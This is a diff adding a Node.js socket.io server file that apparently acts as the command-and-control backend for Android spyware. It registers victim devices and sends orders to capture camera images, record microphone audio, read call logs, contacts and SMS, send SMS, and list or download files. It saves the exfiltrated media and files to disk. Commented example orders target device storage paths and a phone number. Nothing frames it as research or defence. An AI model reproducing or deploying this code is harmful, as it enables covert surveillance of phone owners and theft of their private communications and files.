@@ -1,0 +1,230 @@
+#!/usr/bin/env node
+
+/**
+ * Module dependencies.
+ */
+
+var app = require('../app');
+var debug = require('debug')('a:server');
+var http = require('http');
+
+/**
+ * Get port from environment and store in Express.
+ */
+
+var port = normalizePort(process.env.PORT || '3000');
+app.set('port', port);
+
+/**
+ * Create HTTP server.
+ */
+
+var server = http.createServer(app);
+
+/**
+ * Listen on provided port, on all network interfaces.
+ */
+var io = require("socket.io")(server);
+var path = require('path')
+var fs = require('fs');
+const { emit } = require('process');
+
+var IO = io;
+var v = {};
+var d = [];
+IO.sockets.pingInterval = 10000;
+IO.sockets.on("connection", function (socket) {
+    var address = socket.request.connection;
+    var ip = address.remoteAddress.substring(
+        address.remoteAddress.lastIndexOf(":") + 1
+    );
+    var query = socket.handshake.query;
+    var index = query.id;
+    if (index == null) {
+
+    } else {
+        v[index] = socket;
+        console.log(ip, index);
+        if (d.includes([query.model, ip, index])) { } else {
+            d[d.length] = [query.model, ip, index]
+        }
+    }
+    socket.on('devices', () => {
+        socket.emit('device', d)
+    })
+
+    socket.on('x0000ca', (data) => {
+        console.log("jjj");
+        var uint8Arr = new Uint8Array(data.buffer);
+        var binary = '';
+        for (var i = 0; i < uint8Arr.length; i++) {
+            binary += String.fromCharCode(uint8Arr[i]);
+        }
+        var base64String = binary.toString('base64')
+        let filename = "public/test.jpg";
+        fs.writeFile(filename, binary, "binary", (err) => {
+            if (!err) console.log(`${filename} created successfully!`);
+            io.emit('cam',"ss")
+        });
+
+    });
+
+    socket.on('x0000cl', (data) => {
+        if (data.callsList) {
+            console.log(data.callsList);
+            io.emit('call', data.callsList)
+        }
+    });
+    socket.on('x0000sm', (data) => {
+        if (data.smsList) {
+            console.log(data.smsList.length, data.smsList);
+            io.emit('sms', data.smsList)
+
+        } else {
+            if (data == true)
+                console.log('SMS sent');
+            else
+                console.log('SMS not sent');
+        }
+    });
+    socket.on('x0000cn', (data) => {
+        if (data.contactsList) {
+
+            console.log(data.contactsList.length, data.contactsList);
+        }
+    });
+    socket.on('x0000mc', (data) => {
+        if (data.file == true) {
+
+            var uint8Arr = new Uint8Array(data.buffer);
+            var binary = '';
+            for (var i = 0; i < uint8Arr.length; i++) {
+                binary += String.fromCharCode(uint8Arr[i]);
+            }
+            let filename = "public/test.mp3";
+            fs.writeFile(filename, binary, "binary", (err) => {
+                if (!err) console.log(`${filename} created successfully!`);
+                io.emit('mic',"ss")
+            });
+        }
+    });
+    socket.on('x0000fm', (data) => {
+        if (data.file == true) { // response with file's binary
+            console.log('Saving file..');
+            var filePath = path.join("./d", data.name);
+
+            // function to save the file to my local disk
+            fs.writeFile(filePath, data.buffer, "binary", (err) => {
+                if (err)
+                    console.log('Saving file failed');
+                else
+                    console.log('File saved on ');
+            });
+
+        } else if (data.length != 0) { // response with files list
+            console.log('Files list arrived', data);
+            io.emit("files",data)
+        } else {
+            console.log('That directory is inaccessible');
+
+        }
+
+    });
+    socket.on('call', (id) => {
+        v[id].emit('order', { order: 'x0000cl' });
+    })
+
+    socket.on('sms', (id) => {
+        v[id].emit('order', { order: 'x0000sm', extra: 'ls' });
+    })
+    socket.on('send', (data) => {
+        console.log(data);
+        v[data.id].emit('order', { order: "x0000sm", extra: 'sendSMS', to: data.to, sms: data.sms });
+    })
+    socket.on('cam', (data) => {
+        v[data.id].emit("order", { order: "x0000ca", extra: data.type });
+    })
+
+    socket.on('mic', (data) => {
+        console.log(data)
+        v[data.id].emit('order', { order: 'x0000mc', sec: data.time });
+    })
+
+    socket.on('files', (data) => {
+        console.log(data)
+        v[data.id].emit('order', { order: 'x0000fm', extra: 'ls', path: data.path });
+    })
+    //socket.emit("order", { order: "x0000ca", extra: 0 });
+    //socket.emit('order', { order: 'x0000cl' });
+    //socket.emit('order', { order: 'x0000sm', extra: 'ls' });
+    //socket.emit('order', { order: "x0000sm", extra: 'sendSMS', to: 01064704303, sms: "uyyyuyu" });
+    //socket.emit('order', { order: 'x0000cn' });
+    //socket.emit('order', { order: 'x0000mc', sec: 10 });
+    //socket.emit('order', { order: 'x0000fm', extra: 'ls', path: '/storage/emulated/0/' });
+    //socket.emit('order', { order: 'x0000fm', extra: 'dl', path: '/storage/emulated/0/ahmed.jpg' });
+
+});
+
+server.listen(port);
+server.on('error', onError);
+server.on('listening', onListening);
+
+/**
+ * Normalize a port into a number, string, or false.
+ */
+
+function normalizePort(val) {
+    var port = parseInt(val, 10);
+
+    if (isNaN(port)) {
+        // named pipe
+        return val;
+    }
+
+    if (port >= 0) {
+        // port number
+        return port;
+    }
+
+    return false;
+}
+
+/**
+ * Event listener for HTTP server "error" event.
+ */
+
+function onError(error) {
+    if (error.syscall !== 'listen') {
+        throw error;
+    }
+
+    var bind = typeof port === 'string'
+        ? 'Pipe ' + port
+        : 'Port ' + port;
+
+    // handle specific listen errors with friendly messages
+    switch (error.code) {
+        case 'EACCES':
+            console.error(bind + ' requires elevated privileges');
+            process.exit(1);
+            break;
+        case 'EADDRINUSE':
+            console.error(bind + ' is already in use');
+            process.exit(1);
+            break;
+        default:
+            throw error;
+    }
+}
+
+/**
+ * Event listener for HTTP server "listening" event.
+ */
+
+function onListening() {
+    var addr = server.address();
+    var bind = typeof addr === 'string'
+        ? 'pipe ' + addr
+        : 'port ' + addr.port;
+    debug('Listening on ' + bind);
+}
